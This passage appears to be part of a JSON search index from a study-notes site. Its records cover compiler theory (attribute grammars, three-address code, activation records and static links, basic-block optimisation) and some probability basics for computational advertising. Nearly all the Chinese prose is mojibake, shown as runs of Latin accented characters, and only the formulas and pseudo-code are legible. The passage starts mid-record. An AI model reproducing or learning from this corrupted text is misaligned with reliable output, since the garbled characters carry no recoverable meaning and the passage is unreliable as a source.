¹æ®å­èŠ‚ç‚¹çš„å±æ€§å’Œçˆ¶èŠ‚ç‚¹è‡ªèº«çš„å±æ€§è®¡ç®—çˆ¶èŠ‚ç‚¹çš„ç»¼åˆå±æ€§  ç»§æ‰¿å±æ€§ï¼š\n è‡ªä¸Šè€Œä¸‹ä¼ é€’ä¿¡æ¯ã€‚ ä»è¯­æ³•è§„åˆ™è§’åº¦çœ‹ï¼šæ ¹æ®å³éƒ¨å€™é€‰å¼ä¸­çš„ç¬¦å·çš„å±æ€§å’Œå·¦éƒ¨è¢«å®šä¹‰ç¬¦å·çš„å±æ€§è®¡ç®—å³éƒ¨å€™é€‰å¼ã€‚ ä»è¯­æ³•æ ‘è§’åº¦çœ‹ï¼šæ ¹æ®çˆ¶èŠ‚ç‚¹å’Œå…„å¼Ÿç»“ç‚¹çš„å±æ€§è®¡ç®—å­èŠ‚ç‚¹çš„ç»§æ‰¿å±æ€§ã€‚  å±æ€§ä¾èµ– #  å±æ€§ä¾èµ–ï¼š\n  å¯¹äºæ²¡å’Œäº§ç”Ÿå¼ $$A \\rightarrow \\alpha $$ éƒ½æœ‰ä¸€å¥—ä¸ä¹‹ç›¸å…³è”çš„è¯­ä¹‰è§„åˆ™ï¼Œæ¯æ¡è§„åˆ™çš„å½¢å¼ä¸ºï¼š$$b := f(c_1, c_2, \u0026hellip; c_k)$$ï¼Œåˆ™æˆ‘ä»¬è¯´ï¼šå±æ€§ b ä¾èµ–äºå±æ€§ $$c_1, c_2, \u0026hellip;, c_k$$ã€‚å…¶ä¸­æœ‰ä¸¤ç§å¯èƒ½æ€§ï¼š\n  b æ˜¯ A çš„ä¸€ä¸ªç»¼åˆå±æ€§å¹¶ä¸” $$c_1, c_2, \u0026hellip;, c_k$$ æ˜¯äº§ç”Ÿå¼å³è¾¹æ–‡æ³•ç¬¦å·çš„å±æ€§\n  b æ˜¯äº§ç”Ÿå¼å³è¾¹æŸä¸ªæ–‡æ³•ç¬¦å·çš„ä¸€ä¸ªç»§æ‰¿å±æ€§å¹¶ä¸” $$c_1, c_2, \u0026hellip;, c_k$$ æ˜¯ A æˆ–äº§ç”Ÿå¼å³è¾¹ä»»ä½•æ–‡æ³•ç¬¦å·çš„å±æ€§\n    ç»ˆç»“ç¬¦åªæœ‰ç»¼åˆå±æ€§ï¼Œç”±è¯æ³•åˆ†æå™¨æä¾›ã€‚\n  éç»ˆç»“ç¬¦æ—¢å¯ä»¥æœ‰ç»¼åˆå±æ€§ä¹Ÿå¯ä»¥æœ‰ç»§æ‰¿å±æ€§ï¼Œæ–‡æ³•å¼€å§‹ç¬¦å·çš„æ‰€æœ‰ç»§æ‰¿å±æ€§ä½œä¸ºå±æ€§è®¡ç®—å‰çš„åˆå§‹å€¼ã€‚\n  è¯­ä¹‰è§„åˆ™ï¼š\n å¯¹å‡ºç°åœ¨äº§ç”Ÿå¼å³è¾¹çš„ç»§æ‰¿å±æ€§å’Œå‡ºç°åœ¨äº§ç”Ÿå¼å·¦è¾¹çš„ç»¼åˆå±æ€§éƒ½å¿…é¡»æä¾›ä¸€ä¸ªè®¡ç®—è§„åˆ™ã€‚å±æ€§è®¡ç®—è§„åˆ™ä¸­åªèƒ½ä½¿ç”¨ç›¸åº”äº§ç”Ÿå¼ä¸­çš„æ–‡æ³•ç¬¦å·çš„å±æ€§ã€‚ å‡ºç°åœ¨äº§ç”Ÿå¼å·¦è¾¹çš„ç»§æ‰¿å±æ€§å’Œå‡ºç°åœ¨äº§ç”Ÿå¼å³è¾¹çš„ç»¼åˆå±æ€§ä¸ç”±æ‰€ç»™äº§ç”Ÿå¼çš„å±æ€§è®¡ç®—è§„åˆ™è¿›è¡Œè®¡ç®—ï¼Œç”±å…¶ä»–äº§ç”Ÿå¼çš„å±æ€§è®¡ç®—è§„åˆ™è¿›è¡Œè®¡ç®—æˆ–è€…ç”±å±æ€§è®¡ç®—å™¨çš„å‚æ•°æä¾›ã€‚ è¯­ä¹‰è§„åˆ™æ‰€æè¿°çš„å·¥ä½œå¯ä»¥åŒ…æ‹¬å±æ€§è®¡ç®—ã€é™æ€è¯­ä¹‰æ£€æŸ¥ã€ç¬¦å·è¡¨æ“ä½œã€ä»£ç ç”Ÿæˆç­‰ã€‚  å±æ€§è®¡ç®— #  ç”±æºç¨‹åºçš„è¯­æ³•ç»“æ„æ‰€é©±åŠ¨çš„å¤„ç†åŠæ³•å°±æ˜¯è¯­æ³•åˆ¶å¯¼ç¿»è¯‘æ³•ã€‚\nåŸºäºå±æ€§æ–‡æ³•çš„å¤„ç†åŠæ³•ï¼šä¾èµ–å›¾ã€æ ‘éå†ã€ä¸€éæ‰«æã€‚\nä¾èµ–å›¾ #  åœ¨ä¸€æ£µè¯­æ³•æ ‘ä¸­ï¼Œç»“ç‚¹çš„ç»§æ‰¿å±æ€§å’Œç»¼åˆå±æ€§ä¹‹é—´çš„ç›¸äº’ä¾èµ–å…³ç³»å¯ä»¥ç”¨ä¾èµ–å›¾æ¥æè¿°ã€‚\nä¾èµ–å›¾çš„æ„é€ ï¼š\n ä¾èµ–å›¾ä¸­ä¸ºæ¯ä¸€ä¸ªå±æ€§è®¾ç½®ä¸€ä¸ªç»“ç‚¹ï¼› å¦‚æœå±æ€§ b ä¾èµ–ä¸å±æ€§ cï¼Œåˆ™ä»å±æ€§ c çš„ç»“ç‚¹æœ‰ä¸€æ¡æœ‰å‘è¾¹é“¾æ¥åˆ°å±æ€§ b çš„ç»“ç‚¹ã€‚  S-å±æ€§æ–‡æ³• #  S-å±æ€§æ–‡æ³•ï¼šåªå«æœ‰ç»¼åˆå±æ€§çš„æ–‡æ³•ã€‚\né€‚åˆä¸€éæ‰«æçš„è‡ªä¸‹è€Œä¸Šåˆ†æã€‚\nè®¡ç®—ï¼ˆåœ¨è‡ªä¸‹è€Œä¸Šçš„åˆ†æå™¨åˆ†æè¾“å…¥ç¬¦å·ä¸²çš„åŒæ—¶è®¡ç®—ç»¼åˆå±æ€§ï¼‰ï¼š\n åœ¨åˆ†ææ ˆä¸­æ·»åŠ ä¸€ä¸ªé™„åŠ åŸŸå­˜æ”¾ç»¼åˆå±æ€§å€¼  L-å±æ€§æ–‡æ³• #  L-å±æ€§æ–‡æ³•ï¼šç»§æ‰¿å±æ€§ä¾èµ–çˆ¶èŠ‚ç‚¹ï¼Œæˆ–å·¦å…„å¼Ÿç»“ç‚¹ã€‚\n"},{"id":375,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/4.%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%A3%E7%A0%81%E7%94%9F%E6%88%90/","title":"4.è¯­ä¹‰åˆ†æå’Œä¸­é—´ä»£ç ç”Ÿæˆ","section":"ç¼–è¯‘åŸç†","content":" å­¦ä¹ åœ°å€ï¼š\n å›½é˜²ç§‘æŠ€å¤§å­¦ä¸­å›½å¤§å­¦ MOOC   è¯­ä¹‰åˆ†æå’Œä¸­é—´ä»£ç ç”Ÿæˆ #  ä¸­é—´è¯­è¨€ #  ç‰¹ç‚¹ï¼š\n ç‹¬ç«‹äºæœºå™¨ å¤æ‚æ€§ä»‹äºæºè¯­è¨€å’Œç›®æ ‡è¯­è¨€ä¹‹é—´  å¸¸ç”¨çš„ä¸­é—´è¯­è¨€ï¼š\n  åç¼€å¼ï¼Œé€†æ³¢å…°å¼è¡¨ç¤º\n  å›¾è¡¨ç¤ºï¼šæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ã€æœ‰å‘æ— ç¯å›¾ï¼ˆDAGï¼‰\n  ä¸‰åœ°å€ä»£ç ï¼šä¸‰å…ƒå¼ã€å››å…ƒå¼ã€é—´æ¥ä¸‰å…ƒå¼\n  åç¼€å¼ #  Lukasiewicz å‘æ˜çš„ä¸€ç§è¡¨è¾¾å¼çš„æ–¹æ³•ï¼Œåˆç§°é€†æ³¢å…°è¡¨ç¤ºæ³•ã€‚\nä¸€ä¸ªè¡¨è¾¾å¼ E çš„åç¼€å½¢å¼å¯ä»¥å¦‚ä¸‹å®šä¹‰ï¼š\n å¦‚æœ E æ˜¯ä¸€ä¸ªå¸¸é‡æˆ–å˜é‡ï¼Œåˆ™ E çš„åç¼€å¼æ˜¯ E è‡ªèº«ã€‚ å¦‚æœ E æ˜¯ $$E_1\\ op\\ E_2$$ å½¢å¼çš„è¡¨è¾¾å¼ï¼Œå…¶ä¸­ op æ˜¯ä»»ä½•äºŒå…ƒæ“ä½œç¬¦ï¼Œåˆ™ E çš„åç¼€å½¢å¼ä¸º $$E_1â€™ E_2\u0026rsquo; op$$ï¼Œå…¶ä¸­ $$E_1\u0026rsquo;$$ å’Œ $$E_2\u0026rsquo;$$ åˆ†åˆ«æ˜¯ $$E_1$$ å’Œ $$E_2$$ çš„åç¼€å½¢å¼ã€‚ å¦‚æœ E æ˜¯ $$(E_1)$$ å½¢å¼çš„è¡¨è¾¾å¼ï¼Œé‚£ä¹ˆ $$E_1$$ çš„åç¼€å¼å°±æ˜¯ E çš„åç¼€å¼ã€‚  å›¾è¡¨ç¤º #  æœ‰å‘æ— ç¯å›¾ï¼ˆDirected acyclic Graphï¼Œç®€ç§° DAGï¼‰:\n å¯¹è¡¨è¾¾å¼ä¸­çš„æ¯ä¸ªå­è¡¨è¾¾å¼ï¼ŒDAG ä¸­éƒ½æœ‰ä¸€ä¸ªç»“ç‚¹ ä¸€ä¸ªå†…éƒ¨ç»“ç‚¹ä»£è¡¨ä¸€ä¸ªæ“ä½œç¬¦ï¼Œå®ƒçš„å­©å­è¡¨ç¤ºæ“ä½œæ•° åœ¨ä¸€ä¸ª DAG ä¸­ä»£è¡¨å…¬å…±å­è¡¨è¾¾å¼çš„ç»“ç‚¹å…·æœ‰å¤šä¸ªçˆ¶èŠ‚ç‚¹ã€‚  ä¸ AST åŒºåˆ«çš„ä¸€ä¸ªç®€å•ç¤ºä¾‹ï¼š\nä¸‰åœ°å€ä»£ç  #  åŸºæœ¬å½¢å¼ï¼šx := y op z\nä¸‰åœ°å€ä»£ç å¯ä»¥çœ‹ä½œæ˜¯ AST æˆ– DAG çš„ä¸€ç§çº¿æ€§è¡¨ç¤ºã€‚\n å¯¹æŠ½è±¡è¯­æ³•æ ‘è¿›è¡Œè‡ªä¸‹è€Œä¸Šï¼Œè‡ªå·¦è€Œå³çš„éå†  ä¸‰åœ°å€çš„è¯­å¥ç§ç±»ï¼š\nx := y op z\t# åŒç›®è¿ç®—ç¬¦\rx := op y\t# å•ç›®è¿ç®—ç¬¦\rx := y\t# ç›´æ¥èµ‹å€¼\rgoto L\t# æ— æ¡ä»¶è·³è½¬\rif x relop y goto L\rif a goto L\t#æ¡ä»¶è·³è½¬\rparam x\t# ä¼ å‚\rcall p, n\t# è°ƒç”¨è¿‡ç¨‹\rreturn y\t# è¿”å›\rx := y[i]\rx[i] := y\t# ç´¢å¼•èµ‹å€¼\rx := \u0026amp;y\rx := *y\r*x := y\t# åœ°å€å’ŒæŒ‡é’ˆèµ‹å€¼ å››å…ƒå¼å®ç°ï¼š\n ä¸€ä¸ªå¸¦æœ‰å››ä¸ªåŸŸçš„è®°å½•ç»“æ„ï¼Œè¿™å››ä¸ªåŸŸåˆ†åˆ«ä¸º opã€arg1ã€arg2 ä»¥åŠ resultã€‚  ä¸‰å…ƒå¼å®ç°ï¼š\n åªç”¨ä¸‰ä¸ªåŸŸè¡¨ç¤º opã€arg1 ä»¥åŠ arg2 è®¡ç®—ç»“æœå¼•ç”¨ï¼šå¼•ç”¨è®¡ç®—è¯¥å€¼çš„è¯­å¥çš„ä½ç½®  ä¸­é—´ä»£ç ç”Ÿæˆ #  "},{"id":376,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/6.%E8%BF%90%E8%A1%8C%E6%97%B6%E7%9A%84%E5%AD%98%E5%82%A8%E7%A9%BA%E9%97%B4%E7%BB%84%E7%BB%87/","title":"6.è¿è¡Œæ—¶çš„å­˜å‚¨ç©ºé—´ç»„ç»‡","section":"ç¼–è¯‘åŸç†","content":" å­¦ä¹ é€”å¾„ï¼š\n å›½é˜²ç§‘æŠ€å¤§å­¦ä¸­å›½å¤§å­¦ MOOC   è¿è¡Œæ—¶å­˜å‚¨ç©ºé—´ç»„ç»‡ #  å‚æ•°ä¼ é€’ #  å‚æ•°ä¼ é€’ä¸»è¦æœ‰å››ç§ä¼ é€’æ–¹å¼ï¼š\n ä¼ åœ°å€ï¼› å¾—ç»“æœï¼šä¼ åœ°å€çš„å˜å½¢ã€‚  æ¯ä¸ªå½¢å‚å¯¹åº”ä¸¤ä¸ªå½¢å¼å•å…ƒï¼šç¬¬ä¸€ä¸ªå­˜æ”¾å®å‚åœ°å€ï¼›ç¬¬äºŒä¸ªå­˜æ”¾å€¼ã€‚ åœ¨è¿‡ç¨‹ä½“ä¸­çš„ä»»ä½•å¼•ç”¨æˆ–èµ‹å€¼éƒ½çœ‹ä½œå¯¹å®ƒçš„ç¬¬äºŒä¸ªå•å…ƒçš„ç›´æ¥è®¿é—®ã€‚ è¿‡ç¨‹å®Œæˆè¿”å›ä¹‹å‰ï¼ŒæŠŠç¬¬äºŒä¸ªå•å…ƒçš„å€¼å­˜æ”¾åˆ°ç¬¬ä¸€çš„å•å…ƒæ‰€æŒ‡å‘ä¸­ã€‚   ä¼ å€¼ï¼› ä¼ åï¼šä¸å¸¸è§ã€‚  åœ¨è¿›å…¥è¢«è°ƒç”¨è¿‡ç¨‹ä¹‹å‰ä¸å¯¹å®åœ¨å‚æ•°é¢„å…ˆè¿›è¡Œè®¡å€¼ï¼Œè€Œæ˜¯è®©è¿‡ç¨‹æä¸­æ¯å½“ä½¿ç”¨åˆ°ç›¸åº”çš„å½¢å¼å‚æ•°æ—¶æ‰ç¥è¯å¯¹å®ƒå®è¡Œè®¡å€¼ï¼ˆæˆ–è®¡ç®—åœ°å€ï¼‰ã€‚ é€šå¸¸æŠŠå®åœ¨å‚æ•°å¤„ç†æˆä¸€ä¸ªå­ç¨‹åºï¼ˆç§°ä¸ºå‚æ•°å­ç¨‹åºï¼‰ï¼Œæ¯å½“è¿‡ç¨‹ä½“ä¸­ä½¿ç”¨åˆ°ç›¸åº”çš„å½¢å¼å‚æ•°æ—¶å°±è°ƒç”¨è¿™ä¸ªå­ç¨‹åºã€‚    è¿è¡Œæ—¶å­˜å‚¨å™¨çš„åˆ’åˆ† #  ä¸€ä¸ªç›®æ ‡ç¨‹åºè¿è¡Œæ—¶æ‰€éœ€çš„å­˜å‚¨ç©ºé—´åŒ…æ‹¬ï¼š\n  å­˜å‚¨ç›®æ ‡ä»£ç çš„ç©ºé—´ $$\\Rightarrow$$ ç®—æ³•\n  å­˜æ”¾æ•°æ®é¡¹ç›®çš„ç©ºé—´ $$\\Rightarrow$$ æ•°æ®ç»“æ„\n  å­˜æ”¾ç¨‹åºè¿è¡Œçš„æ§åˆ¶æˆ–è¿æ¥æ•°æ®æ‰€éœ€è¦çš„å•å…ƒ\n  ç¼–è¯‘ç¨‹åºç»„ç»‡å­˜å‚¨ç©ºé—´é¡»è€ƒè™‘çš„é—®é¢˜ï¼š\n è¿‡ç¨‹æ˜¯å¦å…è®¸é€’å½’ï¼Ÿ å½“æ§åˆ¶ä»ä¸€ä¸ªè¿‡ç¨‹çš„æ´»åŠ¨è¿”å›æ—¶ï¼Œå¯¹å±€éƒ¨åç§°çš„å€¼å¦‚ä½•å¤„ç†ï¼Ÿ è¿‡ç¨‹æ˜¯å¦å…è®¸å¼•ç”¨éå±€éƒ¨åç§°ï¼Ÿ è¿‡ç¨‹è°ƒç”¨æ—¶å¦‚ä½•ä¼ é€’å‚æ•°ï¼Ÿâ€œè¿‡ç¨‹â€æ˜¯å¦å¯ä»¥åšä¸ºå‚æ•°è¢«ä¼ é€’å’Œä½œä¸ºç»“æœè¿”å›ï¼Ÿ å­˜å‚¨ç©ºé—´å¯å¦åœ¨ç¨‹åºæ§åˆ¶ä¸‹è¿›è¡ŒåŠ¨æ€åˆ†é…ï¼Ÿ å­˜å‚¨ç©ºé—´æ˜¯å¦å¿…é¡»æ˜¾å¼åœ°é‡Šæ”¾ï¼Ÿ  å­˜å‚¨åˆ†é…ç­–ç•¥ #  ä¸»è¦æœ‰ä¸¤ç§åˆ†é…ç­–ç•¥ï¼š\n  é™æ€åˆ†é…ç­–ç•¥ï¼šåœ¨ç¼–è¯‘æ—¶èƒ½ç¡®å®šæ•°æ®ç©ºé—´çš„å¤§å°ï¼Œå¹¶ä¸”ä¸ºæ¯ä¸ªæ•°æ®é¡¹ç›®ç¡®å®šå‡ºåœ¨è¿è¡Œæ—¶åˆ»çš„å­˜å‚¨ç©ºé—´ä¸­çš„ä½ç½®ã€‚æ¯”å¦‚ï¼šFORTRAN è¯­è¨€ã€‚\n  åŠ¨æ€åˆ†é…ç­–ç•¥ï¼šåœ¨ç¼–è¯‘æ—¶ä¸èƒ½ç¡®å®šè¿è¡Œæ—¶æ•°æ®ç©ºé—´çš„å¤§å°ï¼Œå…è®¸é€’å½’è¿‡ç¨‹å’ŒåŠ¨æ€ç”³è¯·é‡Šæ”¾å†…å­˜ã€‚\n  æ ˆå¼åŠ¨æ€åˆ†é…ã€å †å¼åŠ¨æ€åˆ†é…ã€‚\n  å‡½æ•°è°ƒç”¨ä½¿ç”¨æ ˆå¼åˆ†é…ç­–ç•¥ï¼Œå˜é‡ç©ºé—´ä½¿ç”¨å †å¼åŠ¨æ€åˆ†é…ã€‚\n    éåµŒå¥—è¿‡ç¨‹è¯­è¨€ #  ç‰¹ç‚¹ï¼š\n å…è®¸è¿‡ç¨‹é€’å½’è°ƒç”¨ã€å¯ä»¥å…è®¸å¯å˜æ•°ç»„ è¿‡ç¨‹å®šä¹‰ä¸å…è®¸åµŒå¥—ï¼ˆå³ ä¸å¯ä»¥åœ¨å‡½æ•°å†…éƒ¨å®šä¹‰å‡½æ•°ï¼‰ æ¯”å¦‚ï¼šC è¯­è¨€ã€‚  å…¶è¿‡ç¨‹ç®¡ç†é€šè¿‡æ ˆå¼ç®¡ç†ï¼Œä¸€ä¸ªç¨‹åºä¸­ï¼ŒæŒ‰ä»¥ä¸‹æ–¹å¼è°ƒç”¨ main -\u0026gt; Q -\u0026gt; R -\u0026gt; Qï¼Œåˆ™å…¶è¿è¡Œæ ˆç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š\nè¿‡ç¨‹è°ƒç”¨å’Œè¿‡ç¨‹è¿”å›ï¼š\n  è¿‡ç¨‹è°ƒç”¨çš„è¯­å¥ P(T1, T2, ..., Tn)ï¼Œç¿»è¯‘ç§°ä¸‹é¢çš„ä»£ç åºåˆ—ï¼š\npar T1\rpar T2\r...\rpar Tn\rcall P, n   è¿‡ç¨‹è°ƒç”¨çš„ç›®æ ‡ä»£ç é€šè¿‡ä»¥ä¸‹çš„æ–¹å¼ç”Ÿæˆï¼š\næ¯ä¸ª par Ti å¯ä»¥ç¿»è¯‘æˆå¦‚ä¸‹çš„æŒ‡ä»¤ï¼š\n# ä¼ å€¼æ–¹å¼ç¿»è¯‘\r(i+3)[TOP] := Ti\r# ä¼ åœ°å€æ–¹å¼ç¿»è¯‘\r(i+3)[TOP] := addr(Ti) å¯¹äº call P, n åˆ™ç¿»è¯‘æˆä»¥ä¸‹çš„æŒ‡ä»¤\n1[TOP] := SP\r3[TOP] := n\rJSR P\t# è·³è½¬æŒ‡ä»¤ è½¬è¿›è¿‡ç¨‹ P åï¼Œé¦–å…ˆæ‰§è¡Œä¸‹è¿°æŒ‡ä»¤\nSP := TOP + 1\r1[SP] := è¿”å›åœ°å€\rTOP := TOP + L å…¶ä¸­ï¼ŒL ä¸ºè¿‡ç¨‹ P çš„ç«ä¸è®°å½•æ‰€éœ€è¦çš„å•å…ƒæ•°ï¼Œåœ¨ç¼–è¯‘æ—¶å¯ç¡®å®šã€‚\n  è¿‡ç¨‹è¿”å›æ—¶ï¼Œåº”æ‰§è¡Œä¸‹é¢çš„æŒ‡ä»¤ï¼š\nTOP := SP - 1\rSP := 0[SP]\rX := 2[TOP]\rUJ 0[X]   åµŒå¥—è¿‡ç¨‹è¯­è¨€ #  ç‰¹ç‚¹ï¼š\n å…è®¸è¿‡ç¨‹é€’å½’è°ƒç”¨ã€ä¹Ÿå¯ä»¥å…è®¸å¯å˜æ•°ç»„ è¿‡ç¨‹å®šä¹‰å…è®¸åµŒå¥— æ¯”å¦‚ï¼šPASCAL è¯­è¨€  å› ä¸ºç¨‹åºè¿è¡Œæ—¶ï¼Œè¿‡ç¨‹å¯ä»¥è®¿é—®å¤–å±‚è¿‡ç¨‹çš„å˜é‡ã€‚ç¨‹åºè¿è¡Œæ—¶ï¼Œå¿…é¡»èƒ½çŸ¥é“å®ƒæ‰€æœ‰å¤–å±‚è¿‡ç¨‹çš„å½“å‰æ´»åŠ¨è®°å½•çš„èµ·å§‹åœ°å€ã€‚\néå±€éƒ¨åå­—çš„è®¿é—®\u0026ndash;é™æ€é“¾è¡¨æ–¹æ³• #  åµŒå¥—å±‚æ¬¡ï¼š\n ä¸»ç¨‹åºçš„å±‚æ¬¡ä¸º 0 åœ¨ç¬¬ i å±‚ä¸­å®šä¹‰çš„è¿‡ç¨‹ï¼Œå…¶å±‚æ¬¡ä¸º i+1  æ¯ä¸€ä¸ªå±€éƒ¨å˜é‡ç”¨ä¸€ä¸ª åµŒå¥—å±‚æ•° + åœ°å€åç§»é‡ çš„äºŒå…ƒç»„å”¯ä¸€ç¡®å®šã€‚å¹¶å¢åŠ ä»¥ä¸‹ä¸¤ä¸ªå˜é‡ï¼š\n  åŠ¨æ€é“¾ï¼šæŒ‡å‘æœ¬è¿‡ç¨‹çš„è°ƒç”¨è¿‡ç¨‹çš„æ´»åŠ¨è®°å½•çš„èµ·å§‹åœ°å€ï¼Œä¹Ÿç§°æ§åˆ¶é“¾ã€‚\n  é™æ€é“¾ï¼šæŒ‡å‘æœ¬è¿‡ç¨‹çš„ç›´æ¥å¤–å±‚è¿‡ç¨‹çš„æ´»åŠ¨è®°å½•èµ·å§‹åœ°å€ï¼Œä¹Ÿç§°å­˜å–é“¾ã€‚\n  æ¯”å¦‚ï¼Œä¸€ä¸ª $$P \\overset{call}{\\rightarrow} S \\overset{call}{\\rightarrow} Q \\overset{call}{\\rightarrow} R \\overset{call}{\\rightarrow} R$$ çš„è°ƒç”¨æ ˆå¸§å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\nå¯¹äºè°ƒç”¨è¿‡ç¨‹ $$P_1 \\xrightarrow{call} P_2$$ï¼Œå¦‚ä½•æ ¹æ®è°ƒç”¨è¿‡ç¨‹ P1 çš„æ´»åŠ¨è®°å½•å»ºç«‹ P2 çš„é™æ€é“¾ï¼Ÿ\n ç¬¬ N å±‚è¿‡ç¨‹è°ƒç”¨ç¬¬ N+1 å±‚è¿‡ç¨‹ï¼šP2 çš„é™æ€é“¾ä¸ºè°ƒç”¨è¿‡ç¨‹ P1ï¼ˆç¬¬ N å±‚è¿‡ç¨‹çš„ï¼‰çš„æœ€æ–°æ´»åŠ¨è®°å½•çš„èµ·å§‹åœ°å€ã€‚ ç¬¬ N å±‚è¿‡ç¨‹è°ƒç”¨ç¬¬ N å±‚è¿‡ç¨‹ï¼šP2 çš„é™æ€é“¾ä¸ºè°ƒç”¨è¿‡ç¨‹ P1ï¼ˆç¬¬ N å±‚è¿‡ç¨‹ï¼‰çš„é™æ€é“¾çš„å€¼ã€‚ ç¬¬ N å±‚è¿‡ç¨‹è°ƒç”¨ç¬¬ N-x å±‚è¿‡ç¨‹ï¼šP2 çš„é™æ€é“¾ä¸ºæ²¿ç€è°ƒç”¨è¿‡ç¨‹ P1ï¼ˆç¬¬ N å±‚è¿‡ç¨‹ï¼‰çš„é™æ€é“¾å‘å‰èµ° x æ­¥åˆ°è¾¾çš„æ´»åŠ¨è®°å½•çš„é™æ€é“¾çš„å€¼ã€‚  éå±€éƒ¨åå­—çš„è®¿é—®\u0026ndash;Display è¡¨æ–¹æ³• #  Display è¡¨ï¼š\n åœ¨æ´»åŠ¨è®°å½•ä¸­å¢åŠ ä¸€ä¸ª Display è¡¨ï¼š  è¿›å…¥ä¸€ä¸ªè¿‡ç¨‹æ—¶ï¼Œ    "},{"id":377,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/7.%E4%BC%98%E5%8C%96/","title":"7.ä¼˜åŒ–","section":"ç¼–è¯‘åŸç†","content":" å­¦ä¹ é€”å¾„ï¼š\n å›½é˜²ç§‘æŠ€å¤§å­¦ä¸­å›½å¤§å­¦ MOOC   ä¼˜åŒ– #  ä¼˜åŒ–çš„ç§ç±»ï¼š\n åˆ é™¤å¤šä½™è¿ç®—ï¼ˆåˆ é™¤å…¬ç”¨å­è¡¨è¾¾å¼ï¼‰ åˆå¹¶å·²çŸ¥é‡ å¤å†™ä¼ æ’­ åˆ é™¤æ— ç”¨èµ‹å€¼ ä»£ç å¤–æ å¼ºåº¦æ¶ˆå¼± å˜æ¢å¾ªç¯æ§åˆ¶æ¡ä»¶  ä¼˜åŒ–çš„çº§åˆ«ï¼š\n å±€éƒ¨ä¼˜åŒ– å¾ªç¯ä¼˜åŒ– å…¨å±€ä¼˜åŒ–  å±€éƒ¨ä¼˜åŒ– #  åŸºæœ¬å—çš„åˆ’åˆ† #  åŸºæœ¬å—ï¼š\n ç¨‹åºä¸­ä»¥é¡ºåºæ‰§è¡Œçš„è¯­å¥åºåˆ—ï¼› å…¶ä¸­åªæœ‰ä¸€ä¸ªå…¥å£å’Œä¸€ä¸ªå‡ºå£ã€‚å…¥å£å°±æ˜¯å…¶ä¸­çš„ç¬¬ä¸€ä¸ªè¯­å¥ï¼Œå‡ºå£å°±æ˜¯å…¶ä¸­çš„æœ€åä¸€ä¸ªè¯­å¥ã€‚  åˆ’åˆ†ç®—æ³•ï¼š\n  æ‰¾åˆ°ä¸­é—´è¯­å¥ï¼ˆä¸‰åœ°å€è¯­å¥ï¼‰ç¨‹åºä¸­çš„å„ä¸ªåŸºæœ¬å¿«çš„å…¥å£è¯­å¥ã€‚å®ƒå¯èƒ½æ˜¯\n ç¨‹åºçš„ç¬¬ä¸€ä¸ªè¯­å¥ï¼› èƒ½å¤Ÿç”±æ¡ä»¶è½¬ç§»è¯­å¥æˆ–æ— æ¡ä»¶è½¬ç§»è¯­å¥è½¬ç§»åˆ°çš„è¯­å¥ï¼› ç´§è·Ÿåœ¨æ¡ä»¶è½¬ç§»è¯­å¥åé¢çš„è¯­å¥ã€‚    å¯¹ä»¥ä¸Šæ±‚å‡ºçš„æ¯ä¸ªå…¥å£è¯­å¥ï¼Œç¡®å®šå…¶æ‰€å±çš„åŸºæœ¬å¿«ã€‚\nå®ƒæ˜¯ç”±è¯¥å…¥å£è¯­å¥ A åˆ°ä¸‹ä¸€å…¥å£è¯­å¥ Bï¼ˆä¸åŒ…æ‹¬ Bï¼‰ã€æˆ–åˆ°ä¸€è½¬ç§»è¯­å¥ Bï¼ˆåŒ…æ‹¬ Bï¼‰ã€æˆ–åœè¯­å¥ Bï¼ˆåŒ…æ‹¬ Bï¼‰ä¹‹é—´çš„è¯­å¥åºåˆ—ç»„æˆçš„ã€‚\n  å‡¡æœªè¢«çº³å…¥æŸä¸€åŸºæœ¬å—ä¸­çš„è¯­å¥ï¼Œå¯ä»¥ä»ç¨‹åºä¸­åˆ é™¤ã€‚\n  "},{"id":378,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%A1%E7%AE%97%E5%B9%BF%E5%91%8A/10.%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%87%86%E5%A4%87/","title":"10.åŸºç¡€çŸ¥è¯†å‡†å¤‡","section":"è®¡ç®—å¹¿å‘Š","content":"åŸºç¡€çŸ¥è¯†å‡†å¤‡ #  åŸºç¡€æ¦‚å¿µ #   å› ä¸ºç¬”è€…å¤ªåƒåœ¾ï¼Œè¡¥å……çš„ä¸€äº›è­¬å¦‚ã€Šçº¿æ€§ä»£æ•°ã€‹ã€ã€Šæ¦‚ç‡è®ºä¸æ•°ç†ç»Ÿè®¡ã€‹ç­‰çš„çŸ¥è¯†\n æ­£å®šçŸ©é˜µï¼š\n   ç†µï¼ˆEntropyï¼‰ï¼š\n çƒ­åŠ›å­¦ä¸­çš„æ¦‚å¿µï¼Œç”±é¦™å†œå¼•å…¥åˆ°ä¿¡æ¯è®ºä¸­ï¼› è®¾ $$X \\in {x_1, x_2, \\cdots, x_n}$$ ä¸ºä¸€ä¸ªç¦»æ•£éšæœºå˜é‡ï¼Œå…¶æ¦‚ç‡åˆ†å¸ƒä¸º $$p(X = x_i) = p_i, i = 1,2,\\cdots, n$$ï¼Œåˆ™ X çš„ç†µä¸ºï¼š $$\\displaystyle H(X) = - \\sum_{i = 1}^n p_i log p_i, \\text{ where when pi = 0, define } H(X) = 0$$  æå¤§ä¼¼ç„¶ä¼°è®¡ï¼š\n   å…ˆéªŒæ¦‚ç‡ã€åéªŒæ¦‚ç‡ï¼š\n   è¾¹ç¼˜æ¦‚ç‡ï¼š\n   é©¬å°”å¯å¤«é“¾è’™ç‰¹å¡æ´›ï¼ˆMarkov chain Monte Carloï¼ŒMCMCï¼‰æ–¹æ³•ï¼š\n   ä¿¡æ¯æ£€ç´¢ #  